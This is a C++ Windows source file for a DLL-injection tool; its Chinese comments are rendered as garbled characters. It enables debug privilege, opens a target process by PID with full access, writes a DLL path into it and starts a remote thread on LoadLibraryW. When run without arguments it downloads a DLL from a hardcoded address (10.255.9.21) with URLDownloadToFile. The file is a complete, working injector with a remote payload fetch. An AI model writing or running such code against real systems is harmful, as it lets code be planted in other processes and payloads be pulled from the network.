// Inject_my_dll.cpp : �������̨Ӧ�ó������ڵ㡣
// ���ط������˵�dll����ע�뵽���н��̵��С�

#include "StdAfx.h"
#pragma comment(lib, "urlmon.lib")
#define DEF_URL L"http://10.255.9.21/dlltest.dll"
#define DEF_FILENAME L"test.dll"



//  ����Ȩ��
BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	HANDLE hToken;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken))
	{
		_tprintf(L"OpenProcessToken error: %u\n", GetLastError());
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL,           // lookup privilege on local system
		lpszPrivilege,  // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		_tprintf(L"LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		_tprintf(L"AdjustTokenPrivileges error: %d\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		_tprintf(L"The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

/*
1.	����OpenProcess() ���Ŀ����̵ľ����PROCESS_ALL_ACCESSȨ�ޣ�
2.	��Ҫע���DLL·��д��Ŀ������ڴ棬����VirtualAllocEx ()��Ŀ���������һ�黺����
3.	����WreProcessMemory()��Ҫע���dll·��д�뻺�������С�
4.	��ȡLoadLibraryW()�ĵ�ַ������kernel32.dll�����н����м��صĵ�ַ������ͬ�ģ����Կ�����ôд��
5.	����CreateRemoteThread()����Զ���߳�
*/
BOOL InjectMyDll(DWORD dwPID, LPCTSTR szDllPath)
{
	HMODULE hmod = NULL;
	HANDLE h_process = NULL, h_thread = NULL;
	LPVOID p_remotebuf = NULL;
	DWORD dw_bufsize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
	LPTHREAD_START_ROUTINE pThreadProc;

	//1. ����ʹ��OpenProcess API����ȡĿ����̵ľ����
	//dwPIDΪ������������Ŀ����̵�pid��
	if (!(h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
	{
		_tprintf(L"Open process error: %d\n", GetLastError());
		return FALSE;
	}

	//2. ��Ŀ������������ڴ棬���ڴ��dll������path
	//��СΪdllpath�Ĵ�С
	p_remotebuf = VirtualAllocEx(h_process, NULL, dw_bufsize, MEM_COMMIT, PAGE_READWRITE);

	//3.����WriteProcessMemory ��dll ��·��д�뻺��������
	WriteProcessMemory(h_process, p_remotebuf, (LPVOID)szDllPath, dw_bufsize, NULL);

	//4. ��ȡLoadLibrary API�ĵ�ַ
	hmod = GetModuleHandle(L"kernel32.dll");
	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hmod, "LoadLibraryW");

	//5.����CreateRemoteThread ����Զ���߳�
	h_thread = CreateRemoteThread(h_process, NULL, 0, pThreadProc, p_remotebuf, 0, NULL);
	WaitForSingleObject(h_thread, INFINITE);

	//6.�رվ��
	CloseHandle(h_thread);
	CloseHandle(h_process);

	return 1;

}



BOOL URL_Download(LPCTSTR url_to_download, LPCTSTR local_filename)
{
	HMODULE h_mod = NULL;
	TCHAR szpath[_MAX_PATH] = { 0, };

	if (!GetModuleFileName(h_mod, szpath, _MAX_PATH))
		return FALSE;

	TCHAR *p = _tcsrchr(szpath, '\\');

	//http://www.xuebuyuan.com/1074527.html  tcscpy������Ҫע��Խ�����⡣
	_tcscpy_s(p + 1, wcslen(local_filename) + 1, local_filename);
	_tprintf(L"start to download %s\n", szpath);
	HRESULT re;
	if ((re = URLDownloadToFile(NULL, url_to_download, szpath, 0, NULL)) == S_OK)
		_tprintf(L"download succeesed\n");

	return TRUE;
}

int _tmain(int argc, TCHAR **argv)
{
	if (argc != 3)
	{
		_tprintf(L"USAGE: %s <pid> <dll_path>\n", argv[0]);
		(DWORD)URL_Download(DEF_URL, DEF_FILENAME);
		return TRUE;
	}

	//change privilege
	if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
	{
		_tprintf(L"fail to change privilege with error %d\n", GetLastError);
		return TRUE;
	}

	//start to inject dll
	//TCHAR *szDllName = _tcschr(argv[2], "\\");
	if ((DWORD)InjectMyDll(_tstol(argv[1]), argv[2]))
	{
		_tprintf(L"inject dll %s success!", argv[2]);
	}
	else
		_tprintf(L"fail to inject %s with error %d\n", argv[2], GetLastError);
	return 0;
}

